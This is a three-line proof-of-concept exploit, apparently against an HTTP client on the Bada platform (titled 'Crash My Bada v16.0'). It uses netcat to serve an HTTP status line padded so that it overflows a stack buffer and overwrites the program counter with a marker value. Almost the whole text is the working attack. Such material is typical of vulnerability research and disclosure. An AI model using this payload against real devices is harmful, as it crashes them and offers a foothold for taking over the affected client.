# Crash My Bada v16.0
# stack based overflow in auStack_18, overwriting PC
echo -ne "HTTP/AAAABBBBCCCCDDD\xAD\xDE\xAD\xDE 200 OK\r\n\r\n" | nc -l -p 8080
